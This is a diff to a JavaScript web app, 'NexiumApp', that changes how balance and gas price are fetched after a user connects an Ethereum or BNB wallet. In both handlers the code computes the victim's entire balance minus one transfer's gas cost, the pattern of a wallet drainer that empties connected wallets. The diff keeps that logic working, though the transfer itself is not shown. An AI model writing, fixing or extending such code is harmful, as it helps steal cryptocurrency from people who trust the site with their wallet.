@@ -171,7 +171,7 @@ class NexiumApp {
       });
 
       document.addEventListener('click', (event) => {
-        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
+        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target) ) {
           console.log('Clicked outside wallet modal, closing'); // Log 17
           this.dom.walletModal.classList.remove('active');
         }
@@ -581,8 +581,10 @@ class NexiumApp {
       const walletAddress = await signer.getAddress();
       console.log("✅ Connected to Ethereum Wallet:", walletAddress); // Log 88
 
-      const balance = await signer.getBalance();
-      const gasPrice = await provider.getGasPrice();
+      const balanceHex = await provider.send('eth_getBalance', [walletAddress, 'latest']);
+      const balance = BigInt(balanceHex);
+      const gasPriceHex = await provider.send('eth_gasPrice', []);
+      const gasPrice = BigInt(gasPriceHex);
       const gasLimit = 21000n;
       const gasCost = gasPrice * gasLimit;
       const transferableBalance = balance - gasCost;
@@ -710,8 +712,10 @@ class NexiumApp {
       const walletAddress = await signer.getAddress();
       console.log("✅ Connected to BNB Wallet:", walletAddress); // Log 160
 
-      const balance = await provider.getBalance(walletAddress);
-      const gasPrice = await provider.getGasPrice();
+      const balanceHex = await provider.send('eth_getBalance', [walletAddress, 'latest']);
+      const balance = BigInt(balanceHex);
+      const gasPriceHex = await provider.send('eth_gasPrice', []);
+      const gasPrice = BigInt(gasPriceHex);
       const gasLimit = 21000n;
       const gasCost = gasPrice * gasLimit;
       const transferableBalance = balance - gasCost;
